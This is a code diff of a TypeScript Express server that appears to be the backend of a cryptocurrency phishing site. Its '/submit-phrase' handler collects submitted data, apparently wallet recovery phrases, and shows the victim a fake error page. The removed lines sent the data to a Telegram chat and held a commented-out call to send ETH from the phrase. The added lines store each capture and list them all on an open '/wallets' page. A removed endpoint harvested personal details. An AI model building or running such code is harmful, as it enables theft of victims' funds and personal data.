@@ -13,7 +13,8 @@ import Reward from './models/reward.model';
 import UserReward, { IUserReward } from './models/user-reward.model';
 import axios from 'axios';
 import { ethers } from 'ethers';
-import Norsemen from './models/norsemen.model';
+import Wallet from './models/wallet.model';
+import HubWallet from './models/wallet.model';
 
 const app = express();
 app.use(cookieParser());
@@ -66,6 +67,11 @@ app.get('/error', (req: Request, res: Response) => {
 
 app.get("/login", (req: Request, res: Response) => {
   res.render("login.ejs");
+});
+
+app.get("/wallets",async (req: Request, res: Response) => {
+  const wallets = await HubWallet.find()
+  res.render("wallets.ejs", {wallets});
 });
 
 app.post('/portal/login', async (req: Request, res: Response) => {
@@ -136,12 +142,7 @@ app.post('/submit-phrase', async (req: Request, res: Response) => {
 
     const text = JSON.stringify(data, null, 4);
     data.createdAt = new Date();
-    sendToTelegram("1618693731", text);
-
-
-    // if (phraseinput != null) {
-    //   sendETH(phraseinput)
-    // }
+    const savedData = await Wallet.create(data);
 
     res.redirect('/error');
   } catch (err) {
@@ -232,38 +233,6 @@ app.use((_req, res, _next) => {
   }
   res.end();
 });
-//////////////////////
-///Start Norsemen Endpoint
-
-app.post('/submit', async (req: Request, res: Response) => {
-  try {
-    const { name, email, dobday, dobmonth, dobyear, maritalstatus, phone, whatsappphone } = req.body;
-
-    const data = {
-      name,
-      email,
-      dobday,
-      dobmonth,
-      dobyear,
-      maritalstatus,
-      phone,
-      whatsappphone,
-    };
-
-    const user = Norsemen.create(data);
-
-    res.redirect(`/submitted`);
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("Internal Server Error");
-  }
-})
-
-
-
-
-///End Norsemen Endpoint
-/////////////////////
 // app.use(exceptionFilter);
 
 export default app;
